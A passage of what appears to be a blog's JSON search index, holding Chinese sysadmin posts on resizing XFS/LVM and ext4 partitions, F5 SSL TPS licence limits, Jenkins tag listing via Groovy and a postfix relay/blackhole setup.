-\u0026gt; home please enter label for media in drive 0 (timeout in 300 sec) -\u0026gt; home # umount /home # lvreduce -L 2G /dev/mapper/centos-home Do you really want to reduce home? [y/n]: y 然后扩充root分区：\n# lvextend -L +18G /dev/mapper/centos-root # xfs_growfs /dev/mapper/centos-root 最后恢复home分区\n# mkfs.xfs -f /dev/mapper/centos-home # mount /home # xfsrestore -f /home.xfsdump /home 搞定\n","permalink":"https://rendoumi.com/posts/20240124-lvm_resize/","summary":"\u003cp\u003e系统是xfs文件格式。/root空间不够了。必须对空间进行调整，悲剧的是xfs只能增加空间，不能缩减空间，必须曲线救国了。\u003c/p\u003e\n\u003cp\u003e查看一下，缺省有两个lvm的分区\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/dev/mapper/centos-root 40G\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/dev/mapper/centos-home 20G\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e只能减小home分区，再增大root分区了。\u003c/p\u003e\n\u003cp\u003e先备份home分区，并缩小到2G：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# yum -y install xfsdump\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# xfsdump -f /home.xfsdump /home\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eplease enter label \u003cspan class=\"k\"\u003efor\u003c/span\u003e this dump session \u003cspan class=\"o\"\u003e(\u003c/span\u003etimeout in \u003cspan class=\"m\"\u003e300\u003c/span\u003e sec\u003cspan class=\"o\"\u003e)\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-\u0026gt; home\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eplease enter label \u003cspan class=\"k\"\u003efor\u003c/span\u003e media in drive \u003cspan class=\"m\"\u003e0\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003etimeout in \u003cspan class=\"m\"\u003e300\u003c/span\u003e sec\u003cspan class=\"o\"\u003e)\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-\u0026gt; home\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# umount /home\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# lvreduce -L 2G /dev/mapper/centos-home\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDo you really want to reduce home? \u003cspan class=\"o\"\u003e[\u003c/span\u003ey/n\u003cspan class=\"o\"\u003e]\u003c/span\u003e: y  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e然后扩充root分区：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# lvextend -L +18G /dev/mapper/centos-root\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# xfs_growfs /dev/mapper/centos-root\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e最后恢复home分区\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# mkfs.xfs -f /dev/mapper/centos-home\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# mount /home\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# xfsrestore -f /home.xfsdump /home\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e搞定\u003c/p\u003e","title":"LVM调整分区大小"},{"content":"公司用到了SSL的泛域名证书，网站整体套上了HTTPS，然后最前面是F5做SSL的卸载。\n麻烦也来了，F5的SSL Transactions Per Second (TPS) 是有license的，首先检查一下吧\ntmsh show sys license detail | grep -i perf_SSL_total_TPS perf_SSL_total_TPS [500] 显示是500\n还得查查有几个核心\ntmsh show sys tmm-info global | grep -i \u0026#39;TMM count\u0026#39; TMM Count 4 4个核心\n那么每秒SSL的TPS限制就是 500X4=2000\n超过2000就得去增加license了。\n","permalink":"https://rendoumi.com/posts/20240124-f5_bigip_ssl/","summary":"\u003cp\u003e公司用到了SSL的泛域名证书，网站整体套上了HTTPS，然后最前面是F5做SSL的卸载。\u003c/p\u003e\n\u003cp\u003e麻烦也来了，F5的SSL Transactions Per Second (TPS) 是有license的，首先检查一下吧\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etmsh show sys license detail \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep -i perf_SSL_total_TPS  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eperf_SSL_total_TPS \u003cspan class=\"o\"\u003e[\u003c/span\u003e500\u003cspan class=\"o\"\u003e]\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e显示是500\u003c/p\u003e\n\u003cp\u003e还得查查有几个核心\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etmsh show sys tmm-info global \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep -i \u003cspan class=\"s1\"\u003e\u0026#39;TMM count\u0026#39;\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eTMM Count               \u003cspan class=\"m\"\u003e4\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e4个核心\u003c/p\u003e\n\u003cp\u003e那么每秒SSL的TPS限制就是 500X4=2000\u003c/p\u003e\n\u003cp\u003e超过2000就得去增加license了。\u003c/p\u003e","title":"F5-bigip的SSL每秒传输(TPS)限制"},{"content":"场景是这样的，有两台jenkins。一台是正常安装在linux上的，另外一台是在macos上的。\n在macos上的这台，装了有xcode和android studio，负责ipa和apk的自动打包。\n而在linux上jenkins则是主jenkins，负责很多项目的打包。\n这样两台的目标就都很明确，麻烦的是需要来回登录来构建项目，那么有没有方法从第一台上直接调用第二台的项目进行构建呢？\n当然可以，直接发个带Token的url到第二台就可以。\n这个不是本文的重点，本文重点，源码是Git的build过程，jenkins装了Git parameter插件后支持选tag进行building。\n这样如果两台都这么来一下，实际是在两台都git check了一下，然后开始build，这对于第一台来说，毫无必要。\n第一台主jenkins的任务就是看看git项目中都有什么tag，然后把tag发链接给第二台即可，没必要check的。\n而第二台也不去看tag，直接从git中checkout出第一台传过来的tag版本，进行构造，这样最省资源。\n那么，怎么让第一台只查看tag呢？\n万能的groovy大法：\ndef gettags = \u0026#34;git ls-remote -t git@git.coding.net:doabc/app-abc.git\u0026#34;.execute() def tags = [] def t1 = [] gettags.text.eachLine {tags.add(it)} for(i in tags) t1.add(i.split()[1].replaceAll(\u0026#39;\\\\^\\\\{\\\\}\u0026#39;, \u0026#39;\u0026#39;).replaceAll(\u0026#39;refs/tags/\u0026#39;, \u0026#39;\u0026#39;)) t1 = t1.unique() return t1 注意上面，groovy和git的证书需要都事先配好。\n","permalink":"https://rendoumi.com/posts/20240124-jenkins_two_server/","summary":"\u003cp\u003e场景是这样的，有两台jenkins。一台是正常安装在\u003ccode\u003elinux\u003c/code\u003e上的，另外一台是在\u003ccode\u003emacos\u003c/code\u003e上的。\u003c/p\u003e\n\u003cp\u003e在macos上的这台，装了有xcode和android studio，负责ipa和apk的自动打包。\u003c/p\u003e\n\u003cp\u003e而在linux上jenkins则是主jenkins，负责很多项目的打包。\u003c/p\u003e\n\u003cp\u003e这样两台的目标就都很明确，麻烦的是需要来回登录来构建项目，那么有没有方法从第一台上直接调用第二台的项目进行构建呢？\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240124100017245\" loading=\"lazy\" src=\"/posts/20240124-jenkins_two_server/image-20240124100017245.png\"\u003e\u003c/p\u003e\n\u003cp\u003e当然可以，直接发个带Token的url到第二台就可以。\u003c/p\u003e\n\u003cp\u003e这个不是本文的重点，本文重点，源码是Git的build过程，jenkins装了Git parameter插件后支持选tag进行building。\u003c/p\u003e\n\u003cp\u003e这样如果两台都这么来一下，实际是在两台都git  check了一下，然后开始build，这对于第一台来说，毫无必要。\u003c/p\u003e\n\u003cp\u003e第一台主jenkins的任务就是看看git项目中都有什么tag，然后把tag发链接给第二台即可，没必要check的。\u003c/p\u003e\n\u003cp\u003e而第二台也不去看tag，直接从git中checkout出第一台传过来的tag版本，进行构造，这样最省资源。\u003c/p\u003e\n\u003cp\u003e那么，怎么让第一台只查看tag呢？\u003c/p\u003e\n\u003cp\u003e万能的groovy大法：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edef \u003cspan class=\"nv\"\u003egettags\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;git ls-remote -t git@git.coding.net:doabc/app-abc.git\u0026#34;\u003c/span\u003e.execute\u003cspan class=\"o\"\u003e()\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edef \u003cspan class=\"nv\"\u003etags\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"o\"\u003e[]\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edef \u003cspan class=\"nv\"\u003et1\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"o\"\u003e[]\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egettags.text.eachLine \u003cspan class=\"o\"\u003e{\u003c/span\u003etags.add\u003cspan class=\"o\"\u003e(\u003c/span\u003eit\u003cspan class=\"o\"\u003e)}\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efor\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003ei in tags\u003cspan class=\"o\"\u003e)\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    t1.add\u003cspan class=\"o\"\u003e(\u003c/span\u003ei.split\u003cspan class=\"o\"\u003e()[\u003c/span\u003e1\u003cspan class=\"o\"\u003e]\u003c/span\u003e.replaceAll\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;\\\\^\\\\{\\\\}\u0026#39;\u003c/span\u003e, \u003cspan class=\"s1\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e.replaceAll\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;refs/tags/\u0026#39;\u003c/span\u003e, \u003cspan class=\"s1\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e))\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003et1\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e t1.unique\u003cspan class=\"o\"\u003e()\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003ereturn\u003c/span\u003e t1  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e注意上面，groovy和git的证书需要都事先配好。\u003c/p\u003e","title":"两台不同系统上Jenkins的联动"},{"content":"配置postfix允许自由转发内网的邮件，就改一个地方即可，添加允许发送的内网网段：\nvi /etc/postfix/main.cf ... mynetworks = 127.0.0.0/8, 172.16.0.0/16 ... 配置黑洞，所有邮件都接受，然后drop丢掉\nrelayhost = relay_transport = relay relay_domains = static:ALL smtpd_end_of_data_restrictions = check_client_access static:discard 当然，也可以把这些邮件都给送到amavis去，训练它识别垃圾邮件\n测试邮件发送的命令：\necho \u0026#34;body of your email\u0026#34; | mail -s \u0026#34;This is a Subject os version\u0026#34; -r \u0026#34;abc@kindlefan.xin\u0026#34; test@abc.com 注意：CentOS和Ubuntu默认居然都没有mail这条命令的话\nyum install mailx apt-get install bsd-mailx ","permalink":"https://rendoumi.com/posts/20240124-postfix_blackhole/","summary":"\u003cp\u003e配置postfix允许自由转发内网的邮件，就改一个地方即可，添加允许发送的内网网段：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi /etc/postfix/main.cf  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003emynetworks\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e 127.0.0.0/8, 172.16.0.0/16  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e配置黑洞，所有邮件都接受，然后drop丢掉\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003erelayhost\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003erelay_transport\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e relay  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003erelay_domains\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e static:ALL  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003esmtpd_end_of_data_restrictions\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e check_client_access static:discard  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e当然，也可以把这些邮件都给送到amavis去，训练它识别垃圾邮件\u003c/p\u003e\n\u003cp\u003e测试邮件发送的命令：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;body of your email\u0026#34;\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e mail -s \u003cspan class=\"s2\"\u003e\u0026#34;This is a Subject os version\u0026#34;\u003c/span\u003e -r \u003cspan class=\"s2\"\u003e\u0026#34;abc@kindlefan.xin\u0026#34;\u003c/span\u003e test@abc.com  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e注意：\u003ccode\u003eCentOS\u003c/code\u003e和\u003ccode\u003eUbuntu\u003c/code\u003e默认居然都没有mail这条命令的话\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum install mailx  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapt-get install bsd-mailx  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"配置postfix转发局域网邮件以及邮件黑洞"},{"content":"缩小/ 的ext4分区步骤如下：\n首先查看分区是什么文件类型\nfile -sL /dev/sd* /dev/sda: x86 boot sector; GRand Unified Bootloader, stage1 version 0x3, boot drive 0x80, 1st sector stage2 0x2044148, GRUB version 0.94; partition 1: ID=0x82, starthead 32, startsector 2048, 8388608 sectors; partition 2: ID=0x83, active, starthead 75, startsector 8390656, 411039744 sectors, code offset 0x48 /dev/sda1: Linux/i386 swap file (new style) 1 (4K pages) size 1048575 pages /dev/sda2: Linux rev 1.0 ext4 filesystem data (needs journal recovery) (extents) (large files) (huge files) 能看出来sda1是交换分区，那么要缩的分区是/dev/sda2，文件类型是ext4\nok，先确保虚机内/分区只占到5G，然后最好重新拷贝一下qcow2文件，把文件到弄到前面5G中。\n然后修改一下kvm虚机配置，先加个iso进入rescue模式\nvirsh edit xxx 把boot顺序从hd改成cdrom ... \u0026lt;boot dev=\u0026#39;hd\u0026#39;/\u0026gt; \u0026lt;boot dev=\u0026#39;cdrom\u0026#39;/\u0026gt; ... \u0026lt;disk type=\u0026#39;file\u0026#39; device=\u0026#39;cdrom\u0026#39;\u0026gt; \u0026lt;driver name=\u0026#39;qemu\u0026#39; type=\u0026#39;raw\u0026#39;/\u0026gt; \u0026lt;source file=\u0026#39;/export/kvm/iso/CentOS-7-x86_64-NetInstall-1708.iso\u0026#39;/\u0026gt; \u0026lt;target dev=\u0026#39;hdc\u0026#39; bus=\u0026#39;ide\u0026#39;/\u0026gt; \u0026lt;readonly/\u0026gt; \u0026lt;address type=\u0026#39;drive\u0026#39; controller=\u0026#39;0\u0026#39; bus=\u0026#39;1\u0026#39; target=\u0026#39;0\u0026#39; unit=\u0026#39;0\u0026#39;/\u0026gt; \u0026lt;/disk\u0026gt; ... 系统启动，进入cdrom安装，选择Troubleshooting\n选择Rescue\n因为要对磁盘操作，所以不能选1把硬盘mount到/mnt/sysimage，选择3，不mount硬盘，直接进入一个shell\n检查磁盘，缩减/dev/sda2 到5G空间\ne2fsck -f /dev/sda2 resize2fs /dev/sda2 5G 注意，现在只做了一半，文件是被集中到/dev/sda2的前5G空间里面去了。但是，硬盘分区还没有更改。\n接着来，用parted来修改分区\nparted /dev/sda print 查看后发现前2096是swap分区，2是/dev/sda2 删除/dev/sda2 rm 2 重建 mkpart ... primary ... 2096 ... 7096 注意，新建的/dev/sda2起点是2096，分区终点是2096+5000=7096\n最后再运行一下磁盘检查和重建\ne2fsck -f /dev/sda2 resize2fs /dev/sda2 5G 重启搞定！\n","permalink":"https://rendoumi.com/posts/20240124-ext4_resize/","summary":"\u003cp\u003e缩小\u003ccode\u003e/\u003c/code\u003e 的\u003ccode\u003eext4\u003c/code\u003e分区步骤如下：\u003c/p\u003e\n\u003cp\u003e首先查看分区是什么文件类型\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efile -sL /dev/sd*  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/dev/sda:  x86 boot sector\u003cspan class=\"p\"\u003e;\u003c/span\u003e GRand Unified Bootloader, stage1 version 0x3, boot drive 0x80, 1st sector stage2 0x2044148, GRUB version 0.94\u003cspan class=\"p\"\u003e;\u003c/span\u003e partition 1: \u003cspan class=\"nv\"\u003eID\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e0x82, starthead 32, startsector 2048, \u003cspan class=\"m\"\u003e8388608\u003c/span\u003e sectors\u003cspan class=\"p\"\u003e;\u003c/span\u003e partition 2: \u003cspan class=\"nv\"\u003eID\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e0x83, active, starthead 75, startsector 8390656, \u003cspan class=\"m\"\u003e411039744\u003c/span\u003e sectors, code offset 0x48\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/dev/sda1: Linux/i386 swap file \u003cspan class=\"o\"\u003e(\u003c/span\u003enew style\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"m\"\u003e1\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e4K pages\u003cspan class=\"o\"\u003e)\u003c/span\u003e size \u003cspan class=\"m\"\u003e1048575\u003c/span\u003e pages\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/dev/sda2: Linux rev 1.0 ext4 filesystem data \u003cspan class=\"o\"\u003e(\u003c/span\u003eneeds journal recovery\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003eextents\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003elarge files\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003ehuge files\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e能看出来sda1是交换分区，那么要缩的分区是/dev/sda2，文件类型是ext4\u003c/p\u003e\n\u003cp\u003eok，先确保虚机内/分区只占到5G，然后最好重新拷贝一下qcow2文件，把文件到弄到前面5G中。\u003c/p\u003e\n\u003cp\u003e然后修改一下kvm虚机配置，先加个iso进入rescue模式\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evirsh edit xxx  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e把boot顺序从hd改成cdrom\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u0026lt;boot \u003cspan class=\"nv\"\u003edev\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;hd\u0026#39;\u003c/span\u003e/\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u0026lt;boot \u003cspan class=\"nv\"\u003edev\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;cdrom\u0026#39;\u003c/span\u003e/\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u0026lt;disk \u003cspan class=\"nv\"\u003etype\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;file\u0026#39;\u003c/span\u003e \u003cspan class=\"nv\"\u003edevice\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;cdrom\u0026#39;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u0026lt;driver \u003cspan class=\"nv\"\u003ename\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;qemu\u0026#39;\u003c/span\u003e \u003cspan class=\"nv\"\u003etype\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;raw\u0026#39;\u003c/span\u003e/\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u0026lt;\u003cspan class=\"nb\"\u003esource\u003c/span\u003e \u003cspan class=\"nv\"\u003efile\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;/export/kvm/iso/CentOS-7-x86_64-NetInstall-1708.iso\u0026#39;\u003c/span\u003e/\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u0026lt;target \u003cspan class=\"nv\"\u003edev\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;hdc\u0026#39;\u003c/span\u003e \u003cspan class=\"nv\"\u003ebus\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;ide\u0026#39;\u003c/span\u003e/\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u0026lt;readonly/\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u0026lt;address \u003cspan class=\"nv\"\u003etype\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;drive\u0026#39;\u003c/span\u003e \u003cspan class=\"nv\"\u003econtroller\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;0\u0026#39;\u003c/span\u003e \u003cspan class=\"nv\"\u003ebus\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;1\u0026#39;\u003c/span\u003e \u003cspan class=\"nv\"\u003etarget\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;0\u0026#39;\u003c/span\u003e \u003cspan class=\"nv\"\u003eunit\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;0\u0026#39;\u003c/span\u003e/\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u0026lt;/disk\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan 